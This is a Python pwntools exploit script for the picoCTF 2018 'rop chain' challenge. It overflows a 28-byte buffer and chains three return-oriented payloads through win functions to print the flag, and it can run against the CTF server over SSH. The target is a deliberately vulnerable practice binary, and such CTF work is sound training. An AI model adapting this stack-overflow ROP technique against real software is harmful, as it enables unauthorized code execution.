#!/usr/bin/env python

from pwn import *
import sys
argc = len(sys.argv)

context.log_level = 'critical'

#establish elf and collect addresses
e = ELF('./rop')
win1 = e.symbols['win_function1']
win2 = e.symbols['win_function2']
flag = e.symbols['flag']
vuln = e.symbols['vuln']

#store our args for later use
arg1 = 0xbaaaaaad
arg2 = 0xdeadbaad

# find buffer using pwn cyclic
# pwn cyclic 50 | strace ./rop
# --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616168} ---
# +++ killed by SIGSEGV +++
# Segmentation fault
# ~/ctf_writeups/pico2018/binary/rop_chain# pwn cyclic -l 0x61616168
# 28
buf = 28

#remote or local
if argc > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('rop', cwd='/problems/rop-chain_0_6cdbecac1c3aa2316425c7d44e6ddf9d')
else:
	p = process('./rop')


#build our pwn function
def pwn(ret1, ret2, arg):
	payload = ''
	payload+= 'A'*buf
	payload+= p32(ret1)
	payload+= p32(ret2)
	payload+= p32(arg)
	p.sendlineafter('> ', payload)

#send first payload to make win1=true
pwn(win1, vuln, 0)

#send second payload to make win2 = true
pwn(win2, vuln, arg1)

#send third payload to print flag
pwn(flag, vuln, arg2)

#print the stdout and close the program
print p.recvline()[:-1]
p.close()